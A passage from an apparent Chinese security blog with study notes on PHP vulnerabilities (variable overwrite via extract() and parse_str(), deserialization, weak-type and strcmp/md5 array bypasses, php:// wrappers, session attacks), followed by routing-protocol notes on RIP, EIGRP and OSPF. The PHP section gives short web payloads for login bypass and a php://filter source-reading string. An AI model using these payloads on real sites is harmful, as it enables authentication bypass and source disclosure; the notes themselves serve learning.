<li>EXTR_PREFIX_INVALID - 仅在不合法或数字变量名前加上前缀 prefix。</li>
<li>EXTR_IF_EXISTS - 仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。</li>
<li>EXTR_PREFIX_IF_EXISTS - 仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。</li>
<li>EXTR_REFS - 将变量作为引用提取。导入的变量仍然引用了数组参数的值。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">"Original"</span>;</span><br><span class="line">$my_array = <span class="keyword">array</span>(<span class="string">"a"</span> =&gt; <span class="string">"Cat"</span>, <span class="string">"b"</span> =&gt; <span class="string">"Dog"</span>, <span class="string">"c"</span> =&gt; <span class="string">"Horse"</span>);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line">extract($my_array);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\$a = $a; \$b = $b; \$c = $c"</span>;</span><br><span class="line"><span class="comment">//Original $a = Cat; $b = Dog; $c = Horse</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REQUEST_METHOD"</span>]==<span class="string">"POST"</span>)&#123;</span><br><span class="line">    extract($_POST);</span><br><span class="line">    <span class="keyword">if</span>($pass == $password_hard)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"peri0d"</span>.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload：post：pass=123&amp;password_hard=123</p>
<p>传入的 $_POST 是一个数组，为 <code>array(2) {[&quot;pass&quot;]=&gt;string(3) &quot;123&quot; [&quot;password_hard&quot;]=&gt;string(3) &quot;123&quot;}</code></p>
<h2 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str()"></a>parse_str()</h2><blockquote>
<p>parse_str(<em>string,array</em>)</p>
</blockquote>
<p>parse_str() 函数把查询字符串解析到变量中。如果未设置 array 参数，由该函数设置的变量将覆盖已存在的同名变量。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$name = <span class="string">'peri0d'</span>;</span><br><span class="line">parse_str(<span class="string">'name=peri0d_2&amp;sex=1'</span>);</span><br><span class="line"><span class="keyword">echo</span> $name.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> $sex;</span><br><span class="line"><span class="comment">//peri0d_2	1</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_GET[<span class="string">'x'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">    $m = <span class="string">"guest"</span>;</span><br><span class="line">    $x = $_GET[<span class="string">'x'</span>];</span><br><span class="line">    @parse_str($x);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($m[<span class="number">0</span>] == <span class="string">"admin"</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"so easy!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload：?x=m[0]=admin</p>
<p>parse_str($x) 即为 parse_str(m[0]=admin)，实现变量覆盖。</p>
<h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><h2 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h2><ul>
<li>序列化：把一个复杂的数据类型压缩为一个字符串</li>
<li>反序列化：把一个字符串恢复成复杂的数据类型</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$x = &quot;peri0d 2019&quot;;</span><br><span class="line">$y = array(&quot;peri0d&quot;,2019);</span><br><span class="line">echo serialize($x).&apos;&lt;br&gt;&apos;;</span><br><span class="line">echo serialize($y);</span><br><span class="line">//s:11:&quot;peri0d 2019&quot;;</span><br><span class="line">//a:2:&#123;i:0;s:6:&quot;peri0d&quot;;i:1;i:2019;&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><ul>
<li>反序列化对象中存在魔术方法，而且魔术方法中的代码可以被控制，漏洞根据不同的代码可以导致各种攻击</li>
<li>unserialize 函数的变量可控</li>
<li>php 文件存在可利用的类，类中有魔术方法</li>
</ul>
<h2 id="序列化的不同结果"><a href="#序列化的不同结果" class="headerlink" title="序列化的不同结果"></a>序列化的不同结果</h2><ul>
<li>public</li>
<li>private</li>
<li>protect</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $x = <span class="string">"peri0dx"</span>;</span><br><span class="line">    <span class="keyword">public</span>  $y = <span class="string">"peri0dy"</span>;</span><br><span class="line">    <span class="keyword">protected</span> $z = <span class="string">"peri0dz"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$t = <span class="keyword">new</span> test();</span><br><span class="line"><span class="keyword">echo</span> serialize($t);</span><br><span class="line"><span class="comment">//O:4:"test":3:&#123;s:7:"testx";s:7:"peri0dx";s:1:"y";s:7:"peri0dy";s:4:"*z";s:7:"peri0dz";&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><ul>
<li>construct() : 当一个类被创建时自动调用</li>
<li>destruct() : 当一个类被销毁时自动调用</li>
<li>invoke() : 当把一个类当作函数使用时自动调用</li>
<li>toString() : 当把一个类当作字符串使用时自动调用</li>
<li>wakeup() : 当调用unserialize()函数时自动调用</li>
<li>sleep() : 当调用serialize()函数时自动调用</li>
<li>call() : 当要调用的方法不存在或权限不足时自动调用</li>
<li>get() : 这个方法用来获取私有成员属性值的,有一个参数，参数传入你要获取的成员属性的名称，返回获取的属性值</li>
</ul>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/php/magic_method.png" alt></p>
<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>CVE-2016-7124</p>
<h1 id="弱类型"><a href="#弱类型" class="headerlink" title="弱类型"></a>弱类型</h1><h2 id="变量类型"><a href="#变量类型" class="headerlink" title="变量类型"></a>变量类型</h2><ul>
<li>标准类型：布尔，整型，浮点，字符</li>
<li>复杂类型：数据，对象</li>
<li>特殊类型：资源</li>
</ul>
<h2 id="操作之间的比较"><a href="#操作之间的比较" class="headerlink" title="操作之间的比较"></a>操作之间的比较</h2><ol>
<li><p>字符串和数字</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(<span class="number">0</span> == <span class="string">"admin"</span>);    <span class="comment">//T</span></span><br><span class="line">var_dump(<span class="string">"1admin"</span> == <span class="number">1</span>);   <span class="comment">//T</span></span><br><span class="line">var_dump(<span class="string">"admin1"</span> == <span class="number">1</span>);   <span class="comment">//F</span></span><br><span class="line">var_dump(<span class="string">"admin1"</span> == <span class="number">0</span>);   <span class="comment">//T</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>数字和数组</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = <span class="keyword">array</span>();</span><br><span class="line">var_dump(<span class="number">0</span> == $arr);    <span class="comment">//F</span></span><br><span class="line">var_dump(<span class="number">123</span> == $arr);  <span class="comment">//F</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>字符串和数组</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = <span class="keyword">array</span>();</span><br><span class="line">var_dump(<span class="string">'0'</span> == $arr);    <span class="comment">//F</span></span><br><span class="line">var_dump(<span class="string">'123'</span> == $arr);  <span class="comment">//F</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>“合法数字+e+合法数字” 类型的字符串</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(<span class="string">"0e1234"</span> == <span class="string">"0e56789"</span>);   <span class="comment">//T</span></span><br><span class="line">var_dump(<span class="string">"1e1123"</span> == <span class="string">"10"</span>);        <span class="comment">//F</span></span><br><span class="line">var_dump(<span class="string">"1e1"</span> == <span class="string">"10"</span>);           <span class="comment">//T</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>== 和 ===</p>
<p>在PHP里面    ==   比较指比较值，不同类型会转换成同一类型比较。用   ===   比较时，必须值和类型都一样才为true</p>
</li>
</ol>
<h2 id="empty-与-isset"><a href="#empty-与-isset" class="headerlink" title="empty 与 isset"></a>empty 与 isset</h2><ul>
<li>变量为：0, “0”, null, false, array() 时，使用 empty 函数，返回值为 true</li>
<li>变量未定义或为 null 时，isset 函数返回 false，其他都返回 true</li>
</ul>
<h2 id="md5-函数"><a href="#md5-函数" class="headerlink" title="md5 函数"></a>md5 函数</h2><p>传入数组进行比较时全为 true</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr1 = <span class="keyword">array</span>(<span class="string">'test1'</span>, <span class="string">'test2'</span>, <span class="string">'2019'</span>);</span><br><span class="line">$arr2 = <span class="keyword">array</span>(<span class="string">'test3'</span>, <span class="string">'test4'</span>, <span class="string">'2019'</span>);</span><br><span class="line">var_dump(md5($arr1) == md5($arr2));    <span class="comment">//T</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="strcmp-函数"><a href="#strcmp-函数" class="headerlink" title="strcmp 函数"></a>strcmp 函数</h2><blockquote>
<p>strcmp(<em>string1</em>, <em>string2</em>)</p>
</blockquote>
<p>比较 string1 和 string2。如果相等返回 0；如果 string1 小于 string2，返回 &lt;0；如果 string1 大于 string2，返回 &gt;0</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pass = <span class="string">'123456'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'pwd'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(strcmp($_GET[<span class="string">'pwd'</span>], $pass) == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'success'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'fail'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload：?pwd[]=1</p>
<h2 id="in-array-与-array-search"><a href="#in-array-与-array-search" class="headerlink" title="in_array() 与 array_search()"></a>in_array() 与 array_search()</h2><p><strong>in_array()</strong> 函数搜索数组中是否存在指定的值。如果在数组中找到值则返回 TRUE，否则返回 FALSE。</p>
<blockquote>
<p>bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )</p>
</blockquote>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/php/in_array.png" alt></p>
<p><strong>array_search()</strong> 函数在数组中搜索某个键值，并返回对应的键名。如果在数组中找到指定的键值，则返回对应的键名，否则返回 FALSE。如果在数组中找到键值超过一次，则返回第一次找到的键值所匹配的键名。</p>
<blockquote>
<p>array_search(<em>value</em>, <em>array</em>, <em>strict</em>) </p>
</blockquote>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/php/array_search.png" alt></p>
<h2 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h2><p>如果 switch 是数字类型的 case 判断时，switch 会将参数转换为 int 类型</p>
<h1 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h1><h2 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h2><ul>
<li>用于访问本地系统文件，不受 <strong>allow_url_fopen</strong> 和 <strong>allow_url_include</strong> 影响</li>
<li>常与文件包含结合在一起使用</li>
</ul>
<h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h2><ul>
<li>读取源代码并以base-64编码形式输出，不受 <strong>allow_url_fopen</strong> 和 <strong>allow_url_include</strong> 影响</li>
<li>常与文件包含结合在一起使用</li>
<li>经典用法：?file=php://filter/read=convert.base64-encode/resource=./index.php</li>
</ul>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/php/filter.png" alt></p>
<h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h2><ul>
<li>可以访问请求的原始数据的只读流，<strong>allow_url_include</strong> 为 on 时可以使用，不受 <strong>allow_url_fopen</strong> 影响</li>
</ul>
<h1 id="会话认证漏洞"><a href="#会话认证漏洞" class="headerlink" title="会话认证漏洞"></a>会话认证漏洞</h1><ul>
<li>Session 固定攻击</li>
<li>Session 劫持攻击</li>
<li>通常出现在 cookie 验证上，通常不使用 session 认证</li>
</ul>
<h2 id="Session-劫持攻击"><a href="#Session-劫持攻击" class="headerlink" title="Session 劫持攻击"></a>Session 劫持攻击</h2><ul>
<li>获取用户的 session id，然后修改数据</li>
</ul>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/php/session_1.png" alt></p>
<h2 id="Session-固定攻击"><a href="#Session-固定攻击" class="headerlink" title="Session 固定攻击"></a>Session 固定攻击</h2><ul>
<li>用户使用了黑客发送的 session id，网站就不会给用户发送 session id</li>
</ul>
<p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/php/session_2.png" alt></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/03/路由基础/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="peri0d">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/toux.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="peri0d的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/06/03/路由基础/" itemprop="url">计算机网络总结(三)</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-03T11:00:52+08:00">
                2019-06-03
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/总结/" itemprop="url" rel="index">
                    <span itemprop="name">总结</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="Static-Routing"><a href="#Static-Routing" class="headerlink" title="Static Routing"></a>Static Routing</h1><h2 id="Router-Operations"><a href="#Router-Operations" class="headerlink" title="Router Operations"></a>Router Operations</h2><ul>
<li>负责在不同网段之间进行数据转发</li>
<li>通过路由表进行三层数据转发</li>
<li>维护路由表信息</li>
<li>在冗余路径中进行最优路径判断</li>
<li>在三层转发时应用特定转发策略</li>
</ul>
<blockquote>
<p>路由器默认只知道直连的路由信息，路由器永远是隔离网段的</p>
</blockquote>
<h2 id="Static-Routes"><a href="#Static-Routes" class="headerlink" title="Static Routes"></a>Static Routes</h2><ul>
<li>用于小型网络</li>
<li>管理员手工配置路由器路由表实现数据转发</li>
</ul>
<p>优点</p>
<ul>
<li>占用路由器资源小</li>
<li>可以严格控制路由转发</li>
<li>支持广泛</li>
</ul>
<p>缺点</p>
<ul>
<li>网络拓扑变动时无法自动更新</li>
<li>网络很大时配置维护复杂</li>
</ul>
<h2 id="路由器路由条目匹配方式"><a href="#路由器路由条目匹配方式" class="headerlink" title="路由器路由条目匹配方式"></a>路由器路由条目匹配方式</h2><ol>
<li>对数据进行精确匹配</li>
<li>只匹配子网掩码规定的位</li>
<li>匹配最终必须找到一个出接口才能进行转发</li>
<li>如果没有匹配路由，则丢弃数据包，并向源返回一个 ICMP 错误信息</li>
<li>路由器递归查找路由表，直到找到一个出接口为止</li>
</ol>
<h2 id="Default-Routes"><a href="#Default-Routes" class="headerlink" title="Default Routes"></a>Default Routes</h2><ul>
<li>缺省路由</li>
<li>匹配不知道的路由条目</li>
<li>最不精确，永远是最后匹配</li>
</ul>
<h2 id="Load-Balancing"><a href="#Load-Balancing" class="headerlink" title="Load Balancing"></a>Load Balancing</h2><ul>
<li>负载均衡存在于很多地方，这里仅仅只讨论底层网络的负载均衡</li>
<li>基于数据包的负载均衡</li>
<li>基于数据流的负载均衡 (效率更高一些)</li>
</ul>
<p>基于数据包 : 以数据包为单位，将数据包分在每个路径上</p>
<p>基于数据流 : 不同主机到目标主机采用不同的路径</p>
<h1 id="Dynamic-Routing-Protocol"><a href="#Dynamic-Routing-Protocol" class="headerlink" title="Dynamic Routing Protocol"></a>Dynamic Routing Protocol</h1><h2 id="Routing-Protocol-amp-Routed-Protocol"><a href="#Routing-Protocol-amp-Routed-Protocol" class="headerlink" title="Routing Protocol &amp; Routed Protocol"></a>Routing Protocol &amp; Routed Protocol</h2><ul>
<li>路由协议用在不同路由器之间，用来判断到远程网络的路径并维护路由器的路由表</li>
<li>当路径决定之后，路由器会将被路由协议转发到目的网络</li>
<li>被路由协议一般指三层协议，指的是 IP 协议</li>
</ul>
<blockquote>
<p>被路由协议通过路由协议学习路由进行转发</p>
</blockquote>
<h2 id="Dynamic-Routing-Protocol-1"><a href="#Dynamic-Routing-Protocol-1" class="headerlink" title="Dynamic Routing Protocol"></a>Dynamic Routing Protocol</h2><ul>
<li>动态路由协议是运行在路由器上的一个程序，通过路由器的网络，交换数据包来交换路由信息</li>
<li>不同路由器之间通过运行的特定协议，相互交换路由信息</li>
</ul>
<h2 id="Classful-Routing-有类别路由协议"><a href="#Classful-Routing-有类别路由协议" class="headerlink" title="Classful Routing 有类别路由协议"></a>Classful Routing 有类别路由协议</h2><ul>
<li>更新中不使用子网掩码</li>
<li>在一个网络中，只是用相同的子网掩码</li>
<li>在主类网边界进行自动汇总</li>
<li>常见协议：RIPv1, IGRP</li>
</ul>
<h2 id="Classless-Routing-无类别路由协议"><a href="#Classless-Routing-无类别路由协议" class="headerlink" title="Classless Routing 无类别路由协议"></a>Classless Routing 无类别路由协议</h2><ul>
<li>更新中携带子网掩码</li>
<li>支持 VLSM，在同一网络中可以拥有不同子网掩码</li>
<li>支持手工汇总</li>
<li>常见协议：RIPv2, EIGRP, OSPF</li>
</ul>
<h2 id="最佳路由的判定"><a href="#最佳路由的判定" class="headerlink" title="最佳路由的判定"></a>最佳路由的判定</h2><ul>
<li>Metric(度量值)</li>
<li>RIP：Hop Count</li>
<li>OSPF：COST(带宽)</li>
<li>EIGRP：Bandwidth, Delay</li>
</ul>
<h1 id="RIP-Protocol"><a href="#RIP-Protocol" class="headerlink" title="RIP Protocol"></a>RIP Protocol</h1><h2 id="Distance-Vector-Routing-Protocol"><a href="#Distance-Vector-Routing-Protocol" class="headerlink" title="Distance Vector Routing Protocol"></a>Distance Vector Routing Protocol</h2><h2 id="Features"><a href="#Features" class="headerlink" title="Features"></a>Features</h2><ul>
<li>距离矢量型路由信息协议，最根本特点是直接发送路由信息</li>
<li>RIP 使用跳数( hop )作为度量值</li>
<li>距离：跳数(源到目标经过了多少三层设备，或者是具有路由功能的设备)</li>
<li>矢量：出接口</li>
<li>使用 UDP 协议，端口号 520</li>
<li>路由器周期性的发送自己的路由表信息，默认周期 30s</li>
<li>路由器经过多个周期来达到收敛完成(所有路由器路由表完整)</li>
</ul>
<h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><ul>
<li>路由环路</li>
</ul>
<h2 id="Solution-to-Routing-Loops"><a href="#Solution-to-Routing-Loops" class="headerlink" title="Solution to Routing Loops"></a>Solution to Routing Loops</h2><p>路由环路：收敛速度过慢导致不一致的路由信息，从而导致路由环路，其特征为度量值不断上涨</p>
<h3 id="Maximum-Hop-Count"><a href="#Maximum-Hop-Count" class="headerlink" title="Maximum Hop Count"></a>Maximum Hop Count</h3><ul>
<li>定义最大跳数 16，为网络不可达</li>
</ul>
<h3 id="Split-Horizon"><a href="#Split-Horizon" class="headerlink" title="Split Horizon"></a>Split Horizon</h3><ul>
<li>永远不会将一个路由信息从接收这个信息的接口发送出去</li>
</ul>
<h3 id="Route-Poisoning-and-Poison-Reverse"><a href="#Route-Poisoning-and-Poison-Reverse" class="headerlink" title="Route Poisoning and Poison Reverse"></a>Route Poisoning and Poison Reverse</h3><ul>
<li>当网络不可达时将他的度量值置为无穷大，并向外发送出去</li>
</ul>
<h3 id="Hold-Down-Timers"><a href="#Hold-Down-Timers" class="headerlink" title="Hold-Down Timers"></a>Hold-Down Timers</h3><ul>
<li>当收到次优路由时，不立即相信，设置一个抑制计时器，默认 180s，当计时器减到 0 时，更新路由表</li>
</ul>
<blockquote>
<p>次优路由：度量值大，由可达变为不可达</p>
</blockquote>
<h3 id="Triggered-Updates"><a href="#Triggered-Updates" class="headerlink" title="Triggered Updates"></a>Triggered Updates</h3><ul>
<li>The router sends updates when a change in its routing table occurs</li>
</ul>
<h1 id="EIGRP-Protocol"><a href="#EIGRP-Protocol" class="headerlink" title="EIGRP Protocol"></a>EIGRP Protocol</h1><h2 id="EIGRP-Features"><a href="#EIGRP-Features" class="headerlink" title="EIGRP Features"></a>EIGRP Features</h2><ul>
<li>Cisco private protocol</li>
<li>Advanced distance vector</li>
<li>Fast convergence</li>
<li>Support for VLSM and discontiguous subnets</li>
<li>Partial updates</li>
<li>Support for multiple network-layer protocols</li>
<li>Flexible network design</li>
<li>100% loop-free classless routing</li>
<li>Multicast and unicast instead of broadcast address</li>
<li>Loading balancing across equal-cost and unequal-cost pathways</li>
</ul>
<blockquote>
<p>高级的企业级路由选择协议，地位和 OSPF 相当</p>
</blockquote>
<h2 id="EIGRP-Neighbor-Table"><a href="#EIGRP-Neighbor-Table" class="headerlink" title="EIGRP Neighbor Table"></a>EIGRP Neighbor Table</h2><ul>
<li>和所有直连路由器进行条件协商，就是进行条件检查，满足条件才会建立连接关系</li>
<li>所有邻居保存在 Neighbor Table 中，并通过 Neighbor Table 检查状态</li>
<li>邻居又叫下一跳</li>
</ul>
<h2 id="EIGRP-Topology-Table"><a href="#EIGRP-Topology-Table" class="headerlink" title="EIGRP Topology Table"></a>EIGRP Topology Table</h2><ul>
<li>所有从邻居学习来的路由全部保存在 Topology Table 中</li>
</ul>
<h2 id="EIGRP-Routing-Table"><a href="#EIGRP-Routing-Table" class="headerlink" title="EIGRP Routing Table"></a>EIGRP Routing Table</h2><ul>
<li>从 Topology Table 中选择最优的，无环的路径保存在 Routing Table 中</li>
</ul>
<h2 id="DUAL-Terminology"><a href="#DUAL-Terminology" class="headerlink" title="DUAL Terminology"></a>DUAL Terminology</h2><ul>
<li>扩散更新算法，EIGRP 底层所使用的算法</li>
<li>选择到达目标网络最优的，无环路径</li>
<li>AD = 下一跳路由到达目标网络的开销</li>
<li>FD = 本地路由器到达目标网络的开销 = AD + 本地路由到达通告给我 AD 的下一跳路由的开销</li>
<li>Lowest-cost = lowest FD</li>
<li>successor = 到达目标网络的最优的下一跳路由器</li>
<li>Feasible successor = 到达目标网络的次优的下一跳路由器</li>
<li>FC 可行条件 : AD &lt; FDmin，用于防环</li>
</ul>
<blockquote>
<p>当某个路由不可达或没有后继路由会执行一种扩散运算，向所有邻居发送数据，并且必须收到所有回复后才能变为不可达状态</p>
</blockquote>
<h2 id="EIGRP-Packets"><a href="#EIGRP-Packets" class="headerlink" title="EIGRP Packets"></a>EIGRP Packets</h2><ul>
<li>EIGRP数据包直接使用 IP 协议，协议号 88</li>
</ul>
<h2 id="EIGRP-Neighbor"><a href="#EIGRP-Neighbor" class="headerlink" title="EIGRP Neighbor"></a>EIGRP Neighbor</h2><p>EIGRP 建立邻接关系的条件：</p>
<ul>
<li>AS 号：进程域</li>
<li>K 值：使用相同的 Metric</li>
<li>认证</li>
</ul>
<h2 id="EIGRP-Metric"><a href="#EIGRP-Metric" class="headerlink" title="EIGRP Metric"></a>EIGRP Metric</h2><ul>
<li>缺省情况下使用 Bandwith 和 Delay</li>
<li>不建议使用 Reliability 和 Load，他们是变值</li>
</ul>
<h1 id="OSPF-Protocol"><a href="#OSPF-Protocol" class="headerlink" title="OSPF Protocol"></a>OSPF Protocol</h1><h2 id="Features-1"><a href="#Features-1" class="headerlink" title="Features"></a>Features</h2><ul>
<li>Open protocol</li>
<li>Link-State routing protocol</li>
<li>Identify a router uniquely with router-id </li>
</ul>
<blockquote>
<p>高级的企业级路由选择协议，地位和 EIGRP 相当</p>
<p>router-id : 一般使用 IP 地址</p>
</blockquote>
<h2 id="Link-State-Routing-Protocols"><a href="#Link-State-Routing-Protocols" class="headerlink" title="Link-State Routing Protocols"></a>Link-State Routing Protocols</h2><ul>
<li>每个路由选择由每个路由器独立决策</li>
<li>相邻路由器相互交换的是链路状态信息，即描述网络拓扑的信息，构成一个 Topological Database</li>
<li>最终每个路由器都会有一个全网的拓扑结构信息</li>
<li>每个路由只有在网络拓扑发生变化时才会发送更新</li>
<li>一般来讲，链路状态协议比距离矢量型协议判断决策更加准确</li>
</ul>
<h2 id="Link-State-Data-Structures"><a href="#Link-State-Data-Structures" class="headerlink" title="Link-State Data Structures"></a>Link-State Data Structures</h2><ul>
<li>邻居表 Neighbor table<ul>
<li>临接数据库</li>
<li>保存所有已知邻居</li>
</ul>
